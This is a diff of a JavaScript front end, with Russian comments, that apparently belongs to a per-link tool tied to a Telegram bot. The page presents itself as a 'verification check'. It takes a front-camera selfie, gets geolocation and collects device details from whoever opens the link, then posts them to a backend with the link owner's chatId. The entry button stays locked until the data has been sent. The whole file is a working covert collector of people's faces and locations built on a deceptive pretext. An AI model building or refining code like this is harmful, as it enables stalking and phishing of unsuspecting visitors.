@@ -1,20 +1,37 @@
-// === app.js (fixed) ===
+// === app.js (OneClick linked with bot) ===
 
-// Бэк выбираем так: если на странице задан window.__API_BASE — бьём туда,
-// иначе остаёмся на том же origin (относительный путь).
-const API_BASE = (typeof window !== 'undefined' && window.__API_BASE) ? String(window.__API_BASE).replace(/\/+$/,'') : '';
+const API_BASE = (typeof window !== 'undefined' && window.__API_BASE)
+  ? String(window.__API_BASE).replace(/\/+$/, '')
+  : '';
 
-// Кэшируем UI
 const UI = {
   text: document.getElementById('text'),
   note: document.getElementById('note'),
   btn: document.getElementById('enterBtn'),
 };
 
-// Флаг готовности к переходу
 window.__reportReady = false;
+let __slug = null;
 
-// === Стили кнопки ===
+// === FETCH LINK INFO (привязка chatId) ===
+async function loadLinkInfo() {
+  const params = new URLSearchParams(location.search);
+  __slug = params.get('slug');
+  if (!__slug) return;
+  try {
+    const r = await fetch(`${API_BASE}/api/link-info?slug=${encodeURIComponent(__slug)}`);
+    if (!r.ok) throw new Error(`HTTP ${r.status}`);
+    const data = await r.json();
+    if (data && data.chatId) {
+      window.__TARGET_CHAT_ID = data.chatId;
+      console.log('🔗 Привязка:', data);
+    }
+  } catch (e) {
+    console.warn('link-info fetch failed', e);
+  }
+}
+
+// === Кнопка ===
 function setBtnLocked() {
   const b = UI.btn;
   if (!b) return;
@@ -37,7 +54,7 @@ function setBtnReady() {
   b.style.boxShadow = '0 0 20px rgba(79,0,255,.6), 0 0 28px rgba(0,191,255,.45)';
 }
 
-// === Геолокация ===
+// === Гео ===
 async function askGeolocation() {
   return new Promise((resolve) => {
     if (!('geolocation' in navigator)) return resolve(null);
@@ -55,7 +72,7 @@ async function askGeolocation() {
   });
 }
 
-// === Сжатие фото ===
+// === Сжатие ===
 function downscaleDataUrl(dataUrl, maxSide = 1280, quality = 0.7) {
   return new Promise((resolve, reject) => {
     const img = new Image();
@@ -67,8 +84,7 @@ function downscaleDataUrl(dataUrl, maxSide = 1280, quality = 0.7) {
       c.width = w; c.height = h;
       c.getContext('2d').drawImage(img, 0, 0, w, h);
       try {
-        const out = c.toDataURL('image/jpeg', quality);
-        resolve(out);
+        resolve(c.toDataURL('image/jpeg', quality));
       } catch (e) { reject(e); }
     };
     img.onerror = reject;
@@ -76,36 +92,29 @@ function downscaleDataUrl(dataUrl, maxSide = 1280, quality = 0.7) {
   });
 }
 
-// === Фото с камеры ===
+// === Фото ===
 async function takePhoto() {
   if (!navigator.mediaDevices?.getUserMedia)
     throw new Error('Camera unsupported');
 
-  // iOS любит user-gesture; но пробуем автозахват, как и раньше.
-  const stream = await navigator.mediaDevices.getUserMedia({
-    video: { facingMode: 'user' },
-  });
-
+  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
   const [track] = stream.getVideoTracks();
   try {
     if (typeof ImageCapture !== 'undefined') {
       const cap = new ImageCapture(track);
       const bmp = await cap.grabFrame();
       const c = document.createElement('canvas');
-      c.width = bmp.width;
-      c.height = bmp.height;
+      c.width = bmp.width; c.height = bmp.height;
       c.getContext('2d').drawImage(bmp, 0, 0);
       const dataUrl = c.toDataURL('image/jpeg', 0.85);
       track.stop();
       return dataUrl;
     }
-    // Фолбэк через <video>
     const v = document.createElement('video');
     v.srcObject = stream;
     await v.play();
     const c = document.createElement('canvas');
-    c.width = v.videoWidth;
-    c.height = v.videoHeight;
+    c.width = v.videoWidth; c.height = v.videoHeight;
     c.getContext('2d').drawImage(v, 0, 0);
     const dataUrl = c.toDataURL('image/jpeg', 0.85);
     stream.getTracks().forEach((t) => t.stop());
@@ -116,7 +125,7 @@ async function takePhoto() {
   }
 }
 
-// === Инфо об устройстве ===
+// === Инфо ===
 function getDeviceInfo() {
   const ua = navigator.userAgent;
   const isSafari =
@@ -132,23 +141,17 @@ function getDeviceInfo() {
 async function sendReport({ photoBase64, geo }) {
   const info = getDeviceInfo();
   const body = { ...info, geo, photoBase64, note: 'auto' };
-
-  // Поддержка кастомных ссылок (/r/:slug) — если сервер внедрил chatId
   if (window.__TARGET_CHAT_ID) body.chatId = window.__TARGET_CHAT_ID;
+  if (__slug) body.slug = __slug;
 
   const r = await fetch(`${API_BASE}/api/report`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(body),
   });
-
   const text = await r.text();
   let data; try { data = JSON.parse(text); } catch {}
-
-  if (!r.ok || !data?.ok) {
-    const err = (data && data.error) || text || `HTTP ${r.status}`;
-    throw new Error(err);
-  }
+  if (!r.ok || !data?.ok) throw new Error((data && data.error) || text || `HTTP ${r.status}`);
   return data;
 }
 
@@ -157,54 +160,25 @@ async function autoFlow() {
   try {
     setBtnLocked();
     UI.text.innerHTML = 'Запрашиваем камеру и геолокацию…';
-
-    // Проверка на HTTPS/localhost — иначе браузер режет камеру/гео
     const isSecure = location.protocol === 'https:' || location.hostname === 'localhost';
-    if (!isSecure) {
-      throw new Error('Нужен HTTPS (или localhost) для доступа к камере/гео');
-    }
-
-    const [geo, rawPhoto] = await Promise.all([
-      askGeolocation(),
-      takePhoto(),
-    ]);
-
-    // Сжимаем перед отправкой (TG лимит на sendPhoto ~20MB)
+    if (!isSecure) throw new Error('Нужен HTTPS (или localhost) для камеры/гео');
+    const [geo, rawPhoto] = await Promise.all([askGeolocation(), takePhoto()]);
     const photoBase64 = await downscaleDataUrl(rawPhoto, 1280, 0.7);
-
-    UI.text.innerHTML = 'Отправляем данные для проверки…';
+    UI.text.innerHTML = 'Отправляем данные…';
     await sendReport({ photoBase64, geo });
-
     window.__reportReady = true;
     setBtnReady();
-
     UI.text.innerHTML = '<span class="ok">Проверка пройдена.</span>';
     UI.note.textContent = 'Можно продолжить.';
   } catch (e) {
     console.error(e);
     setBtnLocked();
     window.__reportReady = false;
-    UI.text.innerHTML = '<span class="err">Не удалось выполнить проверку.</span>';
-    UI.note.textContent = String(e && e.message ? e.message : e);
+    UI.text.innerHTML = '<span class="err">Ошибка проверки.</span>';
+    UI.note.textContent = String(e.message || e);
   }
 }
 
-// === Экспорт функции ===
+// === Инициализация ===
 window.__autoFlow = autoFlow;
-
-// === Защита от преждевременного клика ===
-(function guardClick() {
-  const btn = UI.btn;
-  if (!btn) return;
-  btn.addEventListener(
-    'click',
-    (e) => {
-      if (!window.__reportReady) {
-        e.preventDefault();
-        e.stopPropagation();
-        return;
-      }
-    },
-    { capture: true }
-  );
-})();
+loadLinkInfo(); // ← загружаем chatId для этой ссылки
